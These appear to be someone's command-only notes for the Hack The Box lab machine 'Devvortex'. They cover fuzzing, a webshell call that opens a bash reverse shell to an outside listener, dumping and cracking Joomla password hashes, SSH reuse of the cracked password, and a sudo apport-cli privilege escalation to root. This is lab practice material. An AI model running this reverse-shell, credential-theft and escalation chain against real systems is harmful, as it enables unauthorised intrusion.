## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)

```bash
nmap -p- --min-rate 10000 10.10.11.242
nmap -p 22,80 -sCV 10.10.11.242

ffuf -u http://10.10.11.242 -H 'Host: FUZZ.devvortex.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

```
## [Feroxbuster](HTTP)
```
feroxbuster -u http://devvortex.htb -x html
```

```
curl http://dev.devvortex.htb/plugins/search/webshell/evil.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'

nc -lvnp 443

```

```

script /dev/null -c bash
stty raw -echo ; fg

cat /etc/passwd | grep 'sh$'

mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
show databases;
show tables;
describe sd4fg_users;
select name,username,password from sd4fg_users;

cat joomla.hashes 

hashcat joomla.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat joomla.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200
hashcat joomla.hashes sqlpass --user -m 3200

su - logan

sshpass -p tequieromucho ssh logan@devvortex.htb

cat user.txt

sudo -l

apport-cli --version

sleep 20 &
kill -ABRT 7650
ls /var/crash/
sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash

sudo apport-cli -f

echo -e "ProblemType: Crash\nArchitecture: amd64" | tee example.crash
sudo apport-cli -c ./example.crash

cat root.txt
```